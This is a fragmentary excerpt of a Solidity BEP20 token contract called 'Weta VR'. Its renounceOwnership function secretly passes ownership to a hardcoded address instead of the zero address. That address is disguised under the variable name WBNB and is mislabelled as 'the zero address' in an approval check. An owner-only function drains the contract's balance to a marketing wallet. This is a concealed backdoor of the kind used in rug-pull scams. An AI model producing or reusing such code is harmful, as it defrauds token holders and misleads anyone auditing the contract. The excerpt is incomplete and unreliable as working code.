...
abstract contract Ownable is Context {
    ...
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0x5C407c1af7E7E1099758188347816ab68c8248B8));
    }
...
contract WetaVR is Context, IBEP20, Ownable {
    using SafeMath for uint256;

    address WBNB = 0x5C407c1af7E7E1099758188347816ab68c8248B8;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "Weta VR";
    string constant _symbol = "WETA";
    ...
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0x5C407c1af7E7E1099758188347816ab68c8248B8), "ERC20: approve from the zero address");
    ...
    function buyetaWithReward() external {
    ...
    function recoverExcess(uint256 amount) external onlyOwner {
        require(amount < address(this).balance, "WETA: Can not send more than contract balance");
        payable(marketingFeeReceiver).transfer(amount);
    }

    // only for recovering tokens that are NOT WETA tokens sent in error by wallets
